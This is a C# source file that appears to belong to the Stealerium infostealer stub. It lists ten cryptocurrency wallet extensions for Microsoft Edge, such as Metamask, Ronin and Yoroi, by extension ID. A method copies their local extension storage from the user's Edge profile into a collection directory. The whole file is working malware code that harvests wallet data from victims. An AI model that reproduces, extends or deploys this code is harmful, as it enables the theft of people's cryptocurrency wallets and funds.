using System.Collections.Generic;
using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers;

namespace Stealerium.Stub.Target.Browsers.Edge
{
    internal class Extensions
    {
        // Dictionary for storing wallet names and corresponding Edge extension IDs
        private static readonly Dictionary<string, string> EdgeWalletsDirectories = new Dictionary<string, string>
        {
            { "Edge_Auvitas", "klfhbdnlcfcaccoakhceodhldjojboga" },
            { "Edge_Math", "dfeccadlilpndjjohbjdblepmjeahlmm" },
            { "Edge_Metamask", "ejbalbakoplchlghecdalmeeeajnimhm" },
            { "Edge_MTV", "oooiblbdpdlecigodndinbpfopomaegl" },
            { "Edge_Rabet", "aanjhgiamnacdfnlfnmgehjikagdbafd" },
            { "Edge_Ronin", "bblmcdckkhkhfhhpfcchlpalebmonecp" },
            { "Edge_Yoroi", "akoiaibnepcedcplijmiamnaigbepmcb" },
            { "Edge_Zilpay", "fbekallmnjoeggkefjkbebpineneilec" },
            { "Edge_Terra_Station", "ajkhoeiiokighlmdnlakpjfoobnjinie" },
            { "Edge_Jaxx", "dmdimapfghaakeibppbfeokhgoikeoci" }
        };

        /// <summary>
        /// Retrieves Edge wallets and saves them to the specified directory.
        /// </summary>
        /// <param name="saveDirectory">The directory where wallets will be saved.</param>
        public static void GetEdgeWallets(string saveDirectory)
        {
            string baseBrowserPath = Path.Combine(Paths.Lappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings");
            BrowserWalletExtensionsHelper.GetWallets(saveDirectory, EdgeWalletsDirectories, baseBrowserPath, "Edge");
        }
    }
}
